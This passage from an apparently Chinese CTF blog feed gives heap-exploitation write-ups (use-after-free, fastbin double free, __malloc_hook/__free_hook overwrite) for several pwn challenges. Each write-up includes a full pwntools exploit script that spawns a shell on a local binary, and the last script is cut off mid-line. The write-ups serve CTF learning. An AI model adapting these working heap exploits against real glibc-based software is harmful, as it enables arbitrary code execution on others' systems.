class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>本题和上题的区别在于创建堆之后不能再修改，因此可以利用double free实现任意地址写</p><p>1.利用unsorted bin泄露libc，计算出ogg</p><p>2.创建两个堆并去释放形成double free</p><p>3.找malloc_hook最近能够绕过大小检查可作为chunk的地址，在该地址上创建堆并将malloc_hook改写为ogg</p><p>4.利用double free会触发mallo_hook的特点解决堆栈不平衡，触发ogg</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/starrysky/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete中free之后未清零造成uaf漏洞</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，再add一个进入unsorted bin，利用uaf漏洞showunsorted bin中的chunk，泄露libc地址并计算free_hook和system</p><p>2.填充tcache大小小于0x90，再add相同大小的chunk，double free之后进入fast bin</p><p>3.申请tcache和fast bin前两个chunk为free_hook，再申请掉fast bin中最后一个chunk，此时该chunk在free_hook地址，将其内容设置为system即可完成任意地址写</p><p>4.申请堆内容为&#x2F;bin&#x2F;sh，再free掉，等同于执行system（&#x2F;bin&#x2F;sh），即可getshell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF例题分析</title>
      <link href="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/"/>
      <url>/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="IDA分析程序"><a href="#IDA分析程序" class="headerlink" title="IDA分析程序"></a>IDA分析程序</h3><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/1.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/2.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/3.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/4.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/5.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete函数中<code>free((void *)heap_ptr[v1]);</code>释放堆之后未将heap_ptr[v1]清零，导致了UAF漏洞</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>利用<code>unsorted bin</code>和<code>main arean </code>连接的特点和UAF漏洞泄露libc地址</li><li>利用UAF漏洞将<code>__malloc_hook</code>改写为ogg</li><li>利用double free的错误触发<code>__malloc_hook</code>执行ogg</li></ul><h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.<code>unsorted bin</code>中两个相邻的空闲堆会合并，所以要先创建两个堆即index为0的堆和index为1的堆，且index为0的堆大小属于unsorted bin</p><p>2.用delete释放index为0的堆，此时heap_ptr[0]仍然指向index为0的堆的地址，再用show输出堆的内容，此时堆已经被释放，所以输出的是该堆的fd</p><p>3.接收输出的地址，该地址在<code>main_arena+88</code>的地方，而<code>__malloc_hook</code>在<code>main_arena</code>向上0x10的地址，因此<code>__malloc_hook</code>地址为接收到的地址-88-0x10</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/6.png" class><p>4.计算libc基址以及利用one_gadget工具得到gadget</p><p>5.<code>unsorted bin</code>中存在堆则申请堆块会从<code>unsorted bin</code>中切割而不会用<code>fast bin</code>中的堆，因此需要再创建一个堆将<code>unsorted bin</code>中的堆抵消</p><p>6.释放大小属于fast bin的堆，再去edit堆的内容，此时修改的是fd，由于fast bin是依靠fd连接的，第二次申请的与释放掉的堆相同大小的堆地址就在被修改的fd的地址，edit第二个堆改写成ogg即可实现任意地址写，但是glibc 2.23中存在一项检测机制</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/7.png" class><p>该机制会判断申请的堆的大小和得到的堆的size位的大小是否同属于一个bin链表中，因此需要寻找一个符合条件的地址作为堆的地址，利用<code>find_fake_fast</code>寻找地址并计算到<code>__malloc_hook</code>的距离</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/8.png" class><p>该chunk的size位大小为0x7f，因此要创建0x60~0x6E大小的堆，将fd改成<code>__malloc_hook </code>-相对距离，即可申请到这个地址并且不报错，由于user data在堆起始地址下0x10，所以要先填充0x13的垃圾数据加上ogg</p><p>7.将同一个堆连续delete两次即可触发ogg</p><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>menu <span class="token operator">=</span> <span class="token string">'choice >> '</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span 